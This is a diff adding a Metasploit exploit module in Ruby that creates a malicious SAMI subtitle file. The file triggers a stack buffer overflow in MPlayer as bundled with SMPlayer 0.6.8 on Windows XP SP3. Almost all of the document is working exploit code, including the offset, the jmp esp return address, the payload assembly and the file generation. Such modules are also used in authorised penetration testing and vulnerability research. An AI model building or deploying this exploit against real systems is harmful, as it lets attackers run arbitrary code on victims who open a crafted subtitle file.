@@ -1,0 +1,105 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = NormalRanking
+
+	include Msf::Exploit::FILEFORMAT
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'MPlayer SAMI Subtitle File Buffer Overflow',
+			'Description'    => %q{
+					This module exploits a stack-based buffer overflow found in the handling
+				of SAMI subtitles files in MPlayer SVN Versions before 33471. It currently
+				targets SMPlayer 0.6.8, which is distributed with a vulnerable version of mplayer.
+
+				The overflow is triggered when an unsuspecting victim opens a movie file first,
+				followed by loading the malicious SAMI subtitles file from the GUI. Or, it can also
+				be done from the console with the mplayer "-sub" option.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         => [
+				'Jacques Louw', # Vulnerability Discovery and PoC
+				'juan vazquez' # Metasploit module
+			],
+			'Version'        => '$Revision: $',
+			'References'     =>
+				[
+					[ 'BID', '49149' ],
+					[ 'OSVDB', '74604' ],
+					[ 'URL', 'http://labs.mwrinfosecurity.com/files/Advisories/mwri_mplayer-sami-subtitles_2011-08-12.pdf' ],
+				],
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'process',
+					'DisablePayloadHandler' => 'true',
+				},
+			'Payload'        =>
+				{
+					'Space'    => 4000,
+					'BadChars' => "\x00\x0a\x0d\x09\x3c\x3e\x5c\x22\x7b\x7d",
+				},
+			'Platform'       => 'win',
+			'Targets'        =>
+				[
+					[ 'SMPlayer 0.6.8 / mplayer.exe Sherpya-SVN-r29355-4.5.0 / Windows XP English SP3',
+						{
+							'Offset' => 1033,
+							'Ret' => 0x016c14df, # jmp esp from mplayer.exe .rsrc
+							'WritableAddress' => 0x013ab3ae # from mplayer.exe .bss
+						}
+					],
+				],
+			'Privileged'     => false,
+			'DisclosureDate' => 'May 19 2011',
+			'DefaultTarget'  => 0))
+
+		register_options(
+			[
+				OptString.new('FILENAME',   [ false, 'The file name.', 'msf.smi']),
+			], self.class)
+	end
+
+	# Split the subtitle to avoid mplayer complaining
+	# about the line max length
+	def sami_encode(s)
+		r = ""
+		i = 0
+		while i < s.length
+			r << s[i, 32]
+			r << "\n"
+			i += 32
+		end
+		r
+	end
+
+	def exploit
+
+		sploit = rand_text(target['Offset'])
+		sploit << [target.ret].pack("V")
+		sploit << "\xeb\x06" # jmp short 0x8
+		sploit << rand_text(2)
+		sploit << [target['WritableAddress']].pack("V")
+		sploit << payload.encoded
+
+		sami = "<SAMI>\n"
+		sami << "<BODY>\n"
+		sami << "<SYNC Start=100550>\n"
+		sami << sami_encode(sploit)
+		sami << "</SYNC>\n"
+		sami << "</BODY>\n"
+		sami << "</SAMI>\n"
+
+		print_status("Creating '#{datastore['FILENAME']}' file ...")
+
+		file_create(sami)
+	end
+
+end
